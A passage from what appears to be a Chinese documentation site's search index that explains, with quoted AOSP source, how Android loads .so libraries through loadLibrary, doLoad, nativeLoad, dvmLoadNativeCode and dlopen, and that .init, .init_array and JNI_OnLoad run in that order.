\u51fd\u6570\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u539f\u751f\u5c42\u7684\u51fd\u6570 // TODO: should be synchronized, but dalvik doesn't support synchronized internal natives. private static native String nativeLoad ( String filename , ClassLoader loader , String ldLibraryPath ); \u76f8\u5e94\u7684\u6587\u4ef6\u8def\u5f84\u4e3a dalvik/vm/native/java_lang_Runtime.cpp \uff0c\u5177\u4f53\u7684 nativeLoad \u51fd\u6570\u5982\u4e0b const DalvikNativeMethod dvm_java_lang_Runtime [] = { { \"freeMemory\" , \"()J\" , Dalvik_java_lang_Runtime_freeMemory }, { \"gc\" , \"()V\" , Dalvik_java_lang_Runtime_gc }, { \"maxMemory\" , \"()J\" , Dalvik_java_lang_Runtime_maxMemory }, { \"nativeExit\" , \"(I)V\" , Dalvik_java_lang_Runtime_nativeExit }, { \"nativeLoad\" , \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/String;\" , Dalvik_java_lang_Runtime_nativeLoad }, { \"totalMemory\" , \"()J\" , Dalvik_java_lang_Runtime_totalMemory }, { NULL , NULL , NULL }, }; \u53ef\u4ee5\u770b\u51fa\u5728 native \u5c42\u5bf9\u5e94\u7684\u51fd\u6570\u662f Dalvik_java_lang_Runtime_nativeLoad\uff0c\u5982\u4e0b /* * static String nativeLoad(String filename, ClassLoader loader, String ldLibraryPath) * * Load the specified full path as a dynamic library filled with * JNI-compatible methods. Returns null on success, or a failure * message on failure. */ static void Dalvik_java_lang_Runtime_nativeLoad ( const u4 * args , JValue * pResult ) { StringObject * fileNameObj = ( StringObject * ) args [ 0 ]; Object * classLoader = ( Object * ) args [ 1 ]; StringObject * ldLibraryPathObj = ( StringObject * ) args [ 2 ]; assert ( fileNameObj != NULL ); char * fileName = dvmCreateCstrFromString ( fileNameObj ); if ( ldLibraryPathObj != NULL ) { char * ldLibraryPath = dvmCreateCstrFromString ( ldLibraryPathObj ); void * sym = dlsym ( RTLD_DEFAULT , \"android_update_LD_LIBRARY_PATH\" ); if ( sym != NULL ) { typedef void ( * Fn )( const char * ); Fn android_update_LD_LIBRARY_PATH = reinterpret_cast < Fn > ( sym ); ( * android_update_LD_LIBRARY_PATH )( ldLibraryPath ); } else { ALOGE ( \"android_update_LD_LIBRARY_PATH not found; .so dependencies will not work!\" ); } free ( ldLibraryPath ); } StringObject * result = NULL ; char * reason = NULL ; bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); if ( ! success ) { const char * msg = ( reason != NULL ) ? reason : \"unknown failure\" ; result = dvmCreateStringFromCstr ( msg ); dvmReleaseTrackedAlloc (( Object * ) result , NULL ); } free ( reason ); free ( fileName ); RETURN_PTR ( result ); } \u6839\u636e\u6ce8\u91ca\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5173\u952e\u7684\u4ee3\u7801\u5728 bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); \u8fd9\u4e00\u884c\u6267\u884c\u540e\u4f1a\u544a\u8bc9\u6211\u4eec\u52a0\u8f7d\u5bf9\u5e94\u7684 so \u662f\u5426\u6210\u529f\u3002 dvmLoadNativeCode \u00b6 \u5176\u57fa\u672c\u7684\u4ee3\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u6ce8\u91ca\u6765\u7b80\u5355\u5224\u65ad\u4e00\u4e0b\u8be5\u51fd\u6570\u7684\u529f\u80fd\uff1a \u7a0b\u5e8f\u6839\u636e\u6307\u5b9a\u7684\u7edd\u5bf9\u8def\u5f84\u52a0\u8f7d\u76f8\u5e94\u7684 native code\uff0c\u4f46\u662f\u5982\u679c\u8be5 library \u5df2\u7ecf\u52a0\u8f7d\u4e86\uff0c\u90a3\u4e48\u5c31\u4e0d\u4f1a\u518d\u6b21\u8fdb\u884c\u52a0\u8f7d\u3002 \u6b64\u5916\uff0c\u6b63\u5982 JNI \u4e2d\u6240\u8bf4\uff0c\u6211\u4eec\u4e0d\u80fd\u5c06\u4e00\u4e2a\u5e93\u52a0\u8f7d\u5230\u591a\u4e2a class loader \u4e2d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u4e2a library \u53ea\u4f1a\u548c\u4e00\u4e2a class loader \u5173\u8054\u3002 \u51fd\u6570\u7684\u57fa\u672c\u6267\u884c\u6d41\u7a0b\u5982\u4e0b \u5229\u7528 findSharedLibEntry \u5224\u65ad\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8fd9\u4e2a\u5e93\uff0c\u4ee5\u53ca\u5982\u679c\u5df2\u7ecf\u52a0\u8f7d\u7684\u8bdd\uff0c\u662f\u4e0d\u662f\u91c7\u7528\u7684\u662f\u540c\u4e00\u4e2aclass loader\u3002 /* * Load native code from the specified absolute pathname. Per the spec, * if we've already loaded a library with the specified pathname, we * return without doing anything. * * TODO? for better results we should absolutify the pathname. For fully * correct results we should stat to get the inode and compare that. The * existing implementation is fine so long as everybody is using * System.loadLibrary. * * The library will be associated with the specified class loader. The JNI * spec says we can't load the same library into more than one class loader. * * Returns \"true\" on success. On failure, sets *detail to a * human-readable description of the error or NULL if no detail is * available; ownership of the string is transferred to the caller. */ bool dvmLoadNativeCode ( const char * pathName , Object * classLoader , char ** detail ) { SharedLib * pEntry ; void * handle ; bool verbose ; /* reduce noise by not chattering about system libraries */ verbose = !! strncmp ( pathName , \"/system\" , sizeof ( \"/system\" ) - 1 ); verbose = verbose && !! strncmp ( pathName , \"/vendor\" , sizeof ( \"/vendor\" ) - 1 ); if ( verbose ) ALOGD ( \"Trying to load lib %s %p\" , pathName , classLoader ); * detail = NULL ; /* * See if we've already loaded it. If we have, and the class loader * matches, return successfully without doing anything. */ pEntry = findSharedLibEntry ( pathName ); if ( pEntry != NULL ) { if ( pEntry -> classLoader != classLoader ) { ALOGW ( \"Shared lib '%s' already opened by CL %p; can't open in %p\" , pathName , pEntry -> classLoader , classLoader ); return false ; } if ( verbose ) { ALOGD ( \"Shared lib '%s' already loaded in same CL %p\" , pathName , classLoader ); } if ( ! checkOnLoadResult ( pEntry )) return false ; return true ; } \u5982\u679c\u6ca1\u6709\u52a0\u8f7d\u7684\u8bdd\uff0c\u5c31\u4f1a\u5229\u7528 dlopen \u6253\u5f00\u8be5\u5171\u4eab\u5e93\u3002 /* * Open the shared library. Because we're using a full path, the system * doesn't have to search through LD_LIBRARY_PATH. (It may do so to * resolve this library's dependencies though.) * * Failures here are expected when java.library.path has several entries * and we have to hunt for the lib. * * The current version of the dynamic linker prints detailed information * about dlopen() failures. Some things to check if the message is * cryptic: * - make sure the library exists on the device * - verify that the right path is being opened (the debug log message * above can help with that) * - check to see if the library is valid (e.g. not zero bytes long) * - check config/prelink-linux-arm.map to ensure that the library * is listed and is not being overrun by the previous entry (if * loading suddenly stops working on a prelinked library, this is * a good one to check) * - write a trivial app that calls sleep() then dlopen(), attach * to it with \"strace -p <pid>\" while it sleeps, and watch for * attempts to open nonexistent dependent shared libs * * This can execute slowly for a large library on a busy system, so we * want to switch from RUNNING to VMWAIT while it executes. This allows * the GC to ignore us. */ Thread * self = dvmThreadSelf (); ThreadStatus oldStatus = dvmChangeStatus ( self , THREAD_VMWAIT ); handle = dlopen ( pathName , RTLD_LAZY ); dvmChangeStatus ( self , oldStatus ); if ( handle == NULL ) { * detail = strdup ( dlerror ()); ALOGE ( \"dlopen( \\\" %s \\\" ) failed: %s\" , pathName , * detail ); return false ; } \u5176\u4e2d\u7684 dlopen \u51fd\u6570( bionic/linker/dlfcn.cpp )\u5982\u4e0b void * dlopen ( const char * filename , int flags ) { ScopedPthreadMutexLocker locker ( & gDlMutex ); soinfo * result = do_dlopen ( filename , flags ); if ( result == NULL ) { __bionic_format_dlerror ( \"dlopen failed\" , linker_get_error_buffer ()); return NULL ; } return result ; } \u5176\u4f1a\u8c03\u7528 do_dlopen \u51fd\u6570( bionic/linker/linker.cpp )\uff0c\u5982\u4e0b soinfo * do_dlopen ( const char * name , int flags ) { if (( flags & ~ ( RTLD_NOW | RTLD_LAZY | RTLD_LOCAL | RTLD_GLOBAL )) != 0 ) { DL_ERR ( \"invalid flags to dlopen: %x\" , flags ); return NULL ; } set_soinfo_pool_protection ( PROT_READ | PROT_WRITE ); soinfo * si = find_library ( name ); //\u5224\u65ad\u662f\u5426\u6709\u8fd9\u4e2a\u5e93\uff0c\u6709\u7684\u8bdd\uff0c\u9700\u8981\u5b8c\u6210\u521d\u59cb\u5316\u5de5\u4f5c if ( si != NULL ) { si -> CallConstructors (); } set_soinfo_pool_protection ( PROT_READ ); return si ; } \u5728\u627e\u5230\u5bf9\u5e94\u7684\u5e93\u4e4b\u540e\uff0c\u4f1a\u4f7f\u7528 si->CallConstructors(); \u6765\u6784\u9020\u76f8\u5173\u4fe1\u606f\uff0c\u5982\u4e0b void soinfo :: CallConstructors () { if ( constructors_called ) { return ; } // We set constructors_called before actually calling the constructors, otherwise it doesn't // protect against recursive constructor calls. One simple example of constructor recursion // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so: // 1. The program depends on libc, so libc's constructor is called here. // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so. // 3. dlopen() calls the constructors on the newly created // soinfo for libc_malloc_debug_leak.so. // 4. The debug .so depends on libc, so CallConstructors is // called again with the libc soinfo. If it doesn't trigger the early- // out above, the libc constructor will be called again (recursively!). constructors_called = true ; if (( flags & FLAG_EXE ) == 0 && preinit_array != NULL ) { // The GNU dynamic linker silently ignores these, but we warn the developer. PRINT ( \" \\\" %s \\\" : ignoring %d-entry DT_PREINIT_ARRAY in shared library!\" , name , preinit_array_count ); } if ( dynamic != NULL ) { for ( Elf32_Dyn * d = dynamic ; d -> d_tag != DT_NULL ; ++ d ) { if ( d -> d_tag == DT_NEEDED ) { const char * library_name = strtab + d -> d_un . d_val ; TRACE ( \" \\\" %s \\\" : calling constructors in DT_NEEDED \\\" %s \\\" \" , name , library_name ); find_loaded_library ( library_name ) -> CallConstructors (); //\u5224\u65ad\u5e93\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d } } } TRACE ( \" \\\" %s \\\" : calling constructors\" , name ); // DT_INIT should be called before DT_INIT_ARRAY if both are present. CallFunction ( \"DT_INIT\" , init_func ); CallArray ( \"DT_INIT_ARRAY\" , init_array , init_array_count , false ); } \u53ef\u4ee5\u770b\u51fa\uff0c\u6b63\u5982\u6ce8\u91ca\u6240\u5199\u7684\uff0c\u5982\u8bf4 .init \u51fd\u6570\u4e0e init_array \u5b58\u5728\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u4f9d\u6b21\u8c03\u7528 .init \u51fd\u6570\u4e0e.init_array \u4e2d\u5bf9\u5e94\u4f4d\u7f6e\u7684\u4ee3\u7801\u3002\u76f8\u5173\u8bf4\u660e\u5982\u4e0b #define DT_INIT 12 /* Address of initialization function */ #define DT_INIT_ARRAY 25 /* Address of initialization function array */ \u5efa\u7acb\u4e00\u4e2a\u6253\u5f00\u7684\u5171\u4eab\u5e93\u7684 entry\uff0c\u5e76\u8bd5\u56fe\u5176\u52a0\u5165\u5230\u5bf9\u5e94\u7684 list \u4e2d\uff0c\u65b9\u4fbf\u7ba1\u7406\u3002\u5982\u679c\u52a0\u5165\u5931\u8d25\u7684\u8bdd\uff0c\u5c31\u4f1a\u5bf9\u5176\u8fdb\u884c\u91ca\u653e\u3002 /* create a new entry */ SharedLib * pNewEntry ; pNewEntry = ( SharedLib * ) calloc ( 1 , sizeof ( SharedLib )); pNewEntry -> pathName = strdup ( pathName ); pNewEntry -> handle = handle ; pNewEntry -> classLoader = classLoader ; dvmInitMutex ( & pNewEntry -> onLoadLock ); pthread_cond_init ( & pNewEntry -> onLoadCond , NULL ); pNewEntry -> onLoadThreadId = self -> threadId ; /* try to add it to the list */ SharedLib * pActualEntry = addSharedLibEntry ( pNewEntry ); if ( pNewEntry != pActualEntry ) { ALOGI ( \"WOW: we lost a race to add a shared lib (%s CL=%p)\" , pathName , classLoader ); freeSharedLibEntry ( pNewEntry ); return checkOnLoadResult ( pActualEntry ); } \u5982\u679c\u52a0\u8f7d\u6210\u529f\uff0c\u5c31\u4f1a\u5229\u7528 dlsym \u6765\u83b7\u53d6\u5bf9\u5e94 so \u6587\u4ef6\u4e2d\u7684 JNI_OnLoad \u51fd\u6570\uff0c\u5982\u679c\u5b58\u5728\u8be5\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u8fdb\u884c\u8c03\u7528\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u3002 else { if ( verbose ) ALOGD ( \"Added shared lib %s %p\" , pathName , classLoader ); bool result = false ; void * vonLoad ; int version ; vonLoad = dlsym ( handle , \"JNI_OnLoad\" ); if ( vonLoad == NULL ) { ALOGD ( \"No JNI_OnLoad found in %s %p, skipping init\" , pathName , classLoader ); result = true ; } else { /* * Call JNI_OnLoad. We have to override the current class * loader, which will always be \"null\" since the stuff at the * top of the stack is around Runtime.loadLibrary(). (See * the comments in the JNI FindClass function.) */ OnLoadFunc func = ( OnLoadFunc ) vonLoad ; Object * prevOverride = self -> classLoaderOverride ; self -> classLoaderOverride = classLoader ; oldStatus = dvmChangeStatus ( self , THREAD_NATIVE ); if ( gDvm . verboseJni ) { ALOGI ( \"[Calling JNI_OnLoad for \\\" %s \\\" ]\" , pathName ); } version = ( * func )( gDvmJni . jniVm , NULL ); dvmChangeStatus ( self , oldStatus ); self -> classLoaderOverride = prevOverride ; if ( version == JNI_ERR ) { * detail = strdup ( StringPrintf ( \"JNI_ERR returned from JNI_OnLoad in \\\" %s \\\" \" , pathName ). c_str ()); } else if ( dvmIsBadJniVersion ( version )) { * detail = strdup ( StringPrintf ( \"Bad JNI version returned from JNI_OnLoad in \\\" %s \\\" : %d\" , pathName , version ). c_str ()); /* * It's unwise to call dlclose() here, but we can mark it * as bad and ensure that future load attempts will fail. * * We don't know how far JNI_OnLoad got, so there could * be some partially-initialized stuff accessible through * newly-registered native method calls. We could try to * unregister them, but that doesn't seem worthwhile. */ } else { result = true ; } if ( gDvm . verboseJni ) { ALOGI ( \"[Returned %s from JNI_OnLoad for \\\" %s \\\" ]\" , ( result ? \"successfully\" : \"failure\" ), pathName ); } } if ( result ) pNewEntry -> onLoadResult = kOnLoadOkay ; else pNewEntry -> onLoadResult = kOnLoadFailed ; pNewEntry -> onLoadThreadId = 0 ; /* * Broadcast a wakeup to anybody sleeping on the condition variable. */ dvmLockMutex ( & pNewEntry -> onLoadLock ); pthread_cond_broadcast ( & pNewEntry -> onLoadCond ); dvmUnlockMutex ( & pNewEntry -> onLoadLock ); return result ; } } \u603b\u7ed3 \u00b6 \u8fd9\u8bf4\u660e\u52a0\u8f7d .so \u6587\u4ef6\u65f6\uff0c\u4f1a\u6309\u7167\u6267\u884c\u5982\u4e0b\u987a\u5e8f\u7684\u51fd\u6570\uff08\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u8df3\u8fc7\uff09 .init \u51fd\u6570 .init_array \u4e2d\u7684\u51fd\u6570 JNI_OnLoad \u51fd\u6570","title":"Android So \u4ecb\u7ecd"},{"location":"android/basic_operating_mechanism/native_layer/so/#so","text":"","title":"so \u4ecb\u7ecd"},{"location":"android/basic_operating_mechanism/native_layer/so/#_1","text":"\u4e3a\u4ec0\u4e48\u4f1a\u7528\u5230 Shared Object(SO) \u5f00\u53d1\u6548\u7387 \u5feb\u901f\u79fb\u690d so \u7684\u7248\u672c \u6839\u636e CPU \u5e73\u53f0\u6709\u6240\u4e0d\u4e00\u6837","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"android/basic_operating_mechanism/native_layer/so/#_2","text":"System.loadLibrary \u5982\u679c\u52a0\u8f7d\u7684\u6587\u4ef6\u540d\u662f xxx \uff0c\u90a3\u4e48\u5176\u5b9e\u52a0\u8f7d\u7684\u662f\u9879\u76ee\u4e2d libs \u76ee\u5f55\u4e0b\u7684 libxxx.so\u6587\u4ef6\u3002 System.load \u5bf9\u5e94 lib \u7684\u7edd\u5bf9\u8def\u5f84\u3002 \u4e3b\u8981\u4f7f\u7528\u7b2c\u4e00\u79cd\u65b9\u5f0f\uff0c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e3b\u8981\u7528\u4e8e\u5728\u63d2\u4ef6\u4e2d\u52a0\u8f7d so \u6587\u4ef6\u3002","title":"\u52a0\u8f7d\u65b9\u6cd5"},{"location":"android/basic_operating_mechanism/native_layer/so/#loadlibrary","text":"\u6839\u636e\u5b98\u65b9 API \u4ecb\u7ecd The call System.loadLibrary(name) is effectively equivalent to the call Runtime.getRuntime().loadLibrary(name) \u53ef\u4ee5\u770b\u51fa\u8be5\u51fd\u6570\u5176\u5b9e\u8c03\u7528\u7684\u662f Runtime.java\uff08 libcore/luni/src/main/java/java/lang/Runtime.java \uff09\u4e2d\u7684\u51fd\u6570 loadLibrary\uff0c\u7ee7\u800c\u4f1a\u7ee7\u7eed\u8c03\u7528 loadLibrary \u53e6\u4e00\u4e2a\u91cd\u8f7d\u51fd\u6570\uff0c\u5b83\u5305\u542b\u4e24\u4e2a\u53c2\u6570 libame\uff0c\u6211\u4eec\u4f20\u5165\u7684\u5e93\u540d\u5b57 VMStack.getCallingClassLoader()\uff0c\u7c7b\u52a0\u8f7d\u5668 ClassLoader\uff0c\u65b9\u4fbf\u4e8e\u53bb\u5bfb\u627e\u76f8\u5e94\u7684 library\u3002 /** * Loads and links the library with the specified name. The mapping of the * specified library name to the full path for loading the library is * implementation-dependent. * * @param libName * the name of the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void loadLibrary ( String libName ) { loadLibrary ( libName , VMStack . getCallingClassLoader ()); } /* * Searches for a library, then loads and links it without security checks. */ void loadLibrary ( String libraryName , ClassLoader loader ) { if ( loader != null ) { String filename = loader . findLibrary ( libraryName ); if ( filename == null ) { throw new UnsatisfiedLinkError ( \"Couldn't load \" + libraryName + \" from loader \" + loader + \": findLibrary returned null\" ); } String error = doLoad ( filename , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } return ; } String filename = System . mapLibraryName ( libraryName ); List < String > candidates = new ArrayList < String >(); String lastError = null ; for ( String directory : mLibPaths ) { String candidate = directory + filename ; candidates . add ( candidate ); if ( IoUtils . canOpenReadOnly ( candidate )) { String error = doLoad ( candidate , loader ); if ( error == null ) { return ; // We successfully loaded the library. Job done. } lastError = error ; } } if ( lastError != null ) { throw new UnsatisfiedLinkError ( lastError ); } throw new UnsatisfiedLinkError ( \"Library \" + libraryName + \" not found; tried \" + candidates ); } \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4e3b\u8981\u7684\u529f\u80fd\u6b63\u5982\u6ce8\u91ca\u6240\u8bf4 Searches for a library, then loads and links it without security checks. \u800c\u5176\u4e2d\u6240\u91c7\u7528\u7684\u52a0\u8f7d\u51fd\u6570\u662f doLoad \u51fd\u6570\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5148\u4e0d\u7ee7\u7eed\u5206\u6790\uff0c\u6211\u4eec\u6765\u770b\u770b load \u51fd\u6570\u5982\u4f55\u3002","title":"loadLibrary \u52a0\u8f7d\u6d41\u7a0b"},{"location":"android/basic_operating_mechanism/native_layer/so/#load","text":"\u6839\u636e\u5b98\u65b9 API \u8bf4\u660e\uff0c\u5982\u4e0b The call System.load(name) is effectively equivalent to the call: java Runtime.getRuntime().load(name) \u5176\u540c\u6837\u4e5f\u662f\u8c03\u7528 Runtime.java \u4e2d\u7684\u51fd\u6570\uff0c\u5982\u4e0b /** * Loads and links the dynamic library that is identified through the * specified path. This method is similar to {@link #loadLibrary(String)}, * but it accepts a full path specification whereas {@code loadLibrary} just * accepts the name of the library to load. * * @param pathName * the absolute (platform dependent) path to the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void load ( String pathName ) { load ( pathName , VMStack . getCallingClassLoader ()); } /* * Loads and links the given library without security checks. */ void load ( String pathName , ClassLoader loader ) { if ( pathName == null ) { throw new NullPointerException ( \"pathName == null\" ); } String error = doLoad ( pathName , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } } \u5176\u540c\u6837\u4e5f\u4f1a\u8c03\u7528load \u7684\u4e24\u4e2a\u53c2\u6570\u7684\u91cd\u8f7d\u51fd\u6570\uff0c\u7ee7\u800c\u4f1a\u8c03\u7528doLoad\u51fd\u6570\u3002 \u65e0\u8bba\u662f\u4e0a\u9762\u7684\u54ea\u4e00\u79cd\u52a0\u8f7d\u65b9\u6cd5\uff0c\u6700\u540e\u90fd\u4f1a\u8c03\u7528Runtime.java\u4e2d\u7684doLoad\u51fd\u6570\u3002","title":"load \u52a0\u8f7d\u6d41\u7a0b"},{"location":"android/basic_operating_mechanism/native_layer/so/#_3","text":"","title":"\u6838\u5fc3\u52a0\u8f7d\u6d41\u7a0b"},{"location":"android/basic_operating_mechanism/native_layer/so/#doload","text":"\u4e0b\u9762\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b doLoad \u51fd\u6570\uff0c\u5982\u4e0b private String doLoad ( String name , ClassLoader loader ) { // Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH, // which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH. // The PathClassLoader set up by frameworks/base knows the appropriate path, so we can load // libraries with no dependencies just fine, but an app that has multiple libraries that // depend on each other needed to load them in most-dependent-first order. // We added API to Android's dynamic linker so we can update the library path used for // the currently-running process. We pull the desired path out of the ClassLoader here // and pass it to nativeLoad so that it can call the private dynamic linker API. // We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the // beginning because multiple apks can run in the same process and third party code can // use its own BaseDexClassLoader. // We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any // dlopen(3) calls made from a .so's JNI_OnLoad to work too. // So, find out what the native library search path is for the ClassLoader in question... String ldLibraryPath = null ; if ( loader != null && loader instanceof BaseDexClassLoader ) { ldLibraryPath = (( BaseDexClassLoader ) loader ). getLdLibraryPath (); } // nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless // of how many ClassLoaders are in the system, but dalvik doesn't support synchronized // internal natives. synchronized ( this ) { return nativeLoad ( name , loader , ldLibraryPath ); } } \u867d\u7136\u6e90\u4ee3\u7801\u5f88\u957f\uff0c\u4f46\u662f\u5f88\u591a\u90e8\u5206\u90fd\u662f\u6ce8\u91ca\uff0c\u4e5f\u8bf4\u660e\u4e86\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528\u8fd9\u6837\u7684\u4e00\u4e2a\u51fd\u6570\u7684\u539f\u56e0\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u539f\u56e0 Android App \u90fd\u662f\u7531 zygote fork \u751f\u6210\u7684\uff0c\u56e0\u6b64\u4ed6\u4eec\u7684 LD_LIBRARY_PATH \u5c31\u662f zygote \u7684LD_LIBRARY_PATH\uff0c\u8fd9\u4e5f\u8bf4\u660e apk \u4e2d\u7684 so \u6587\u4ef6\u4e0d\u5728\u8fd9\u4e2a\u8def\u5f84\u4e0b\u3002 so \u6587\u4ef6\u4e4b\u95f4\u53ef\u80fd\u5b58\u5728\u76f8\u4e92\u4f9d\u8d56\uff0c\u6211\u4eec\u9700\u8981\u6309\u7167\u5176\u6309\u4f9d\u8d56\u5173\u7cfb\u7684\u9006\u65b9\u5411\u8fdb\u884c\u52a0\u8f7d\u3002 \u51fd\u6570\u7684\u57fa\u672c\u601d\u60f3\u5c31\u662f\u627e\u5230\u5e93\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u7136\u540e\u4f7f\u7528 synchronized \u65b9\u5f0f\u8c03\u7528\u4e86 nativeLoad \u51fd\u6570\u3002","title":"doLoad"},{"location":"android/basic_operating_mechanism/native_layer/so/#nativeload","text":"\u800c nativeload \u51fd\u6570\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u539f\u751f\u5c42\u7684\u51fd\u6570 // TODO: should be synchronized, but dalvik doesn't support synchronized internal natives. private static native String nativeLoad ( String filename , ClassLoader loader , String ldLibraryPath ); \u76f8\u5e94\u7684\u6587\u4ef6\u8def\u5f84\u4e3a dalvik/vm/native/java_lang_Runtime.cpp \uff0c\u5177\u4f53\u7684 nativeLoad \u51fd\u6570\u5982\u4e0b const DalvikNativeMethod dvm_java_lang_Runtime [] = { { \"freeMemory\" , \"()J\" , Dalvik_java_lang_Runtime_freeMemory }, { \"gc\" , \"()V\" , Dalvik_java_lang_Runtime_gc }, { \"maxMemory\" , \"()J\" , Dalvik_java_lang_Runtime_maxMemory }, { \"nativeExit\" , \"(I)V\" , Dalvik_java_lang_Runtime_nativeExit }, { \"nativeLoad\" , \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/String;\" , Dalvik_java_lang_Runtime_nativeLoad }, { \"totalMemory\" , \"()J\" , Dalvik_java_lang_Runtime_totalMemory }, { NULL , NULL , NULL }, }; \u53ef\u4ee5\u770b\u51fa\u5728 native \u5c42\u5bf9\u5e94\u7684\u51fd\u6570\u662f Dalvik_java_lang_Runtime_nativeLoad\uff0c\u5982\u4e0b /* * static String nativeLoad(String filename, ClassLoader loader, String ldLibraryPath) * * Load the specified full path as a dynamic library filled with * JNI-compatible methods. Returns null on success, or a failure * message on failure. */ static void Dalvik_java_lang_Runtime_nativeLoad ( const u4 * args , JValue * pResult ) { StringObject * fileNameObj = ( StringObject * ) args [ 0 ]; Object * classLoader = ( Object * ) args [ 1 ]; StringObject * ldLibraryPathObj = ( StringObject * ) args [ 2 ]; assert ( fileNameObj != NULL ); char * fileName = dvmCreateCstrFromString ( fileNameObj ); if ( ldLibraryPathObj != NULL ) { char * ldLibraryPath = dvmCreateCstrFromString ( ldLibraryPathObj ); void * sym = dlsym ( RTLD_DEFAULT , \"android_update_LD_LIBRARY_PATH\" ); if ( sym != NULL ) { typedef void ( * Fn )( const char * ); Fn android_update_LD_LIBRARY_PATH = reinterpret_cast < Fn > ( sym ); ( * android_update_LD_LIBRARY_PATH )( ldLibraryPath ); } else { ALOGE ( \"android_update_LD_LIBRARY_PATH not found; .so dependencies will not work!\" ); } free ( ldLibraryPath ); } StringObject * result = NULL ; char * reason = NULL ; bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); if ( ! success ) { const char * msg = ( reason != NULL ) ? reason : \"unknown failure\" ; result = dvmCreateStringFromCstr ( msg ); dvmReleaseTrackedAlloc (( Object * ) result , NULL ); } free ( reason ); free ( fileName ); RETURN_PTR ( result ); } \u6839\u636e\u6ce8\u91ca\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5173\u952e\u7684\u4ee3\u7801\u5728 bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); \u8fd9\u4e00\u884c\u6267\u884c\u540e\u4f1a\u544a\u8bc9\u6211\u4eec\u52a0\u8f7d\u5bf9\u5e94\u7684 so \u662f\u5426\u6210\u529f\u3002","title":"nativeload"},{"location":"android/basic_operating_mechanism/native_layer/so/#dvmloadnativecode","text":"\u5176\u57fa\u672c\u7684\u4ee3\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u6ce8\u91ca\u6765\u7b80\u5355\u5224\u65ad\u4e00\u4e0b\u8be5\u51fd\u6570\u7684\u529f\u80fd\uff1a \u7a0b\u5e8f\u6839\u636e\u6307\u5b9a\u7684\u7edd\u5bf9\u8def\u5f84\u52a0\u8f7d\u76f8\u5e94\u7684 native code\uff0c\u4f46\u662f\u5982\u679c\u8be5 library \u5df2\u7ecf\u52a0\u8f7d\u4e86\uff0c\u90a3\u4e48\u5c31\u4e0d\u4f1a\u518d\u6b21\u8fdb\u884c\u52a0\u8f7d\u3002 \u6b64\u5916\uff0c\u6b63\u5982 JNI \u4e2d\u6240\u8bf4\uff0c\u6211\u4eec\u4e0d\u80fd\u5c06\u4e00\u4e2a\u5e93\u52a0\u8f7d\u5230\u591a\u4e2a class loader \u4e2d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u4e2a library \u53ea\u4f1a\u548c\u4e00\u4e2a class loader \u5173\u8054\u3002 \u51fd\u6570\u7684\u57fa\u672c\u6267\u884c\u6d41\u7a0b\u5982\u4e0b \u5229\u7528 findSharedLibEntry \u5224\u65ad\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8fd9\u4e2a\u5e93\uff0c\u4ee5\u53ca\u5982\u679c\u5df2\u7ecf\u52a0\u8f7d\u7684\u8bdd\uff0c\u662f\u4e0d\u662f\u91c7\u7528\u7684\u662f\u540c\u4e00\u4e2aclass loader\u3002 /* * Load native code from the specified absolute pathname. Per the spec, * if we've already loaded a library with the specified pathname, we * return without doing anything. * * TODO? for better results we should absolutify the pathname. For fully * correct results we should stat to get the inode and compare that. The * existing implementation is fine so long as everybody is using * System.loadLibrary. * * The library will be associated with the specified class loader. The JNI * spec says we can't load the same library into more than one class loader. * * Returns \"true\" on success. On failure, sets *detail to a * human-readable description of the error or NULL if no detail is * available; ownership of the string is transferred to the caller. */ bool dvmLoadNativeCode ( const char * pathName , Object * classLoader , char ** detail ) { SharedLib * pEntry ; void * handle ; bool verbose ; /* reduce noise by not chattering about system libraries */ verbose = !! strncmp ( pathName , \"/system\" , sizeof ( \"/system\" ) - 1 ); verbose = verbose && !! strncmp ( pathName , \"/vendor\" , sizeof ( \"/vendor\" ) - 1 ); if ( verbose ) ALOGD ( \"Trying to load lib %s %p\" , pathName , classLoader ); * detail = NULL ; /* * See if we've already loaded it. If we have, and the class loader * matches, return successfully without doing anything. */ pEntry = findSharedLibEntry ( pathName ); if ( pEntry != NULL ) { if 